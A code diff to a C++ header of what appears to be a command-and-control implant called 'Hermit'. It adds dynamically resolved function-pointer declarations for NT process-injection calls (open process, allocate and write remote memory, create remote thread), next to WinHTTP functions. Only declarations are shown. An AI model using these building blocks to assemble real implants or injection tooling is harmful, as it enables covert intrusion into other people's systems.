@@ -1,6 +1,7 @@
 #ifndef HERMIT_CORE_PROCS_HPP
 #define HERMIT_CORE_PROCS_HPP
 
+#include <winternl.h>
 #include <windows.h>
 #include <winhttp.h>
 #include <string>
@@ -8,6 +9,13 @@
 namespace Procs
 {
     // NT Functions
+    typedef NTSTATUS    (NTAPI*  LPPROC_NTOPENPROCESS)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
+	typedef NTSTATUS    (NTAPI*  LPPROC_NTALLOCATEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+    typedef NTSTATUS    (NTAPI*  LPPROC_NTWRITEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
+    typedef NTSTATUS    (NTAPI*  LPPROC_NTCREATETHREADEX)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID lpBytesBuffer);
+    typedef NTSTATUS    (NTAPI*  LPPROC_NTWAITFORSINGLEOBJECT)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
+	typedef NTSTATUS    (NTAPI*  LPPROC_NTCLOSE)(HANDLE Handle);
+    // Runtime Library Functions
     typedef PVOID       (NTAPI*  LPPROC_RTLALLOCATEHEAP)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
     // WinHTTP Functions
     typedef HINTERNET   (WINAPI* LPPROC_WINHTTPOPEN)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
@@ -24,10 +32,16 @@ namespace Procs
 
     struct PROCS
     {
-        // NT
+        // NT Functions
+        LPPROC_NTOPENPROCESS              lpNtOpenProcess;
+        LPPROC_NTALLOCATEVIRTUALMEMORY    lpNtAllocateVirtualMemory;
+        LPPROC_NTWRITEVIRTUALMEMORY       lpNtWriteVirtualMemory;
+        LPPROC_NTCREATETHREADEX           lpNtCreateThreadEx;
+        LPPROC_NTWAITFORSINGLEOBJECT      lpNtWaitForSingleObject;
+        LPPROC_NTCLOSE                    lpNtClose;
+        // Runtime Library Functions
         LPPROC_RTLALLOCATEHEAP            lpRtlAllocateHeap;
-
-        // WinHTTP
+        // WinHTTP Functions
         LPPROC_WINHTTPOPEN                lpWinHttpOpen;
         LPPROC_WINHTTPCONNECT             lpWinHttpConnect;
         LPPROC_WINHTTPOPENREQUEST         lpWinHttpOpenRequest;
@@ -43,7 +57,7 @@ namespace Procs
 
     typedef PROCS* PPROCS;
 
-    PPROCS FindProcs(HMODULE hNTDLL, HMODULE hWinHTTPDLL);
+    PPROCS  FindProcs(HMODULE hNTDLL, HMODULE hWinHTTPDLL);
 }
 
 #endif // HERMIT_CORE_PROCS_HPP
